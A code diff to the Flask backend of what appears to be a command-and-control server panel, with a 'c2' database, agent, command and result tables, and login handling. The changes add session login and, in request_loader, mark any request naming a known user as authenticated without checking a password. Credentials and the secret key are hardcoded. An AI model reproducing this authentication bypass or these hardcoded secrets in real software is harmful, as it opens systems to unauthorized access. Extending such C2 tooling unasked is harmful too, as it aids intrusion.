@@ -1,4 +1,5 @@
 from sqlalchemy import desc, func
+from sqlalchemy.sql.functions import user
 from flask_sqlalchemy import SQLAlchemy
 from flaskext.mysql import MySQL
 from flask import Flask, render_template, request, url_for, redirect
@@ -19,6 +20,7 @@ password = "BestC2Ever"
 server = "localhost"
 
 authToken = "areTheyDeadYet"
+app.secret_key = 'My name is bobobo-bo bo-bobobo, but you can call me bobobo'
 
 app.config["SQLALCHEMY_DATABASE_URI"] = "mysql+mysqlconnector://{}:{}@{}/c2".format(
     username, password, server)
@@ -57,6 +59,11 @@ class Users(db.Model):
     username = db.Column(db.String(64), primary_key=True)
 
 
+# for flask login
+class User(flask_login.UserMixin):
+    pass
+
+
 class Agents(db.Model):
 
     guid = db.Column(db.String(64), primary_key=True)
@@ -65,7 +72,11 @@ class Agents(db.Model):
 
 
 def getUserList():
-    return Users.query.all()
+    users_unfiltered = Users.query.all()
+    users = []
+    for x in users_unfiltered:
+        users.append(x.username)
+    return users
 
 
 @login_manager.user_loader
@@ -73,20 +84,20 @@ def user_loader(username):
     users = getUserList()
     if not(username) or username not in str(users):
         return
-    user = Users()
-    user.username = username
+    user = User()
+    user.id = username
     return user
 
 
 @login_manager.request_loader
 def request_loader(request):
     users = getUserList()
-    email = request.form.get('username')
+    username = request.form.get('username')
     if not(username) or username not in str(users):
         return
     user = Users()
-    user.username = username
-    user.is_authenticated = request.form['password'] == password
+    user.id = username
+    user.is_authenticated = True
     return user
 
 
@@ -94,14 +105,14 @@ def request_loader(request):
 @flask_login.login_required
 def home():
     if len(Results.query.all()) == 0:
-        return render_template('index.html', returns=' \n ')
+        return render_template('index.html', returns=' \n ', name=flask_login.current_user.id)
     else:
         get_returns = Results.query.order_by(desc(Results.id))
         get_commands = Command.query.all()
         if request.environ.get('HTTP_X_FORWARDED_FOR') is None:
             return render_template('index.html',
                                    returns=get_returns[0].results,
-                                   commands=get_commands)
+                                   commands=get_commands, name=flask_login.current_user.id)
         else:
             return render_template('redir.html')
 
@@ -184,18 +195,16 @@ def login():
         print("[!] couldn't find all tokens")
         return render_template('redir.html')
 
-    # print("*** before check")
-    check_user = Users.query.filter_by(username=username).first()
-
     if uPassword == password:
-        if check_user != None:
-            if check_user.username != username:
-                new_user = Users(username=username)
-                db.session.add(new_user)
-                db.session.commit()
+        users = getUserList()
+        print(users)
+        if username not in users:
+            new_user = Users(username=username)
+            db.session.add(new_user)
+            db.session.commit()
 
-        user = Users()
-        user.username = username
+        user = User()
+        user.id = username
         flask_login.login_user(user)
         # bring the user to the home page
         print("** before redirect to home")
@@ -210,7 +219,12 @@ def login():
 @flask_login.login_required
 def logout():
     flask_login.logout_user()
-    return redirect(url_for('home', auth=authToken))
+    return render_template('login.html', auth=authToken)
+
+
+@login_manager.unauthorized_handler
+def unauthorized_handler():
+    return render_template('unauth.html')
 
 
 if __name__ == '__main__':
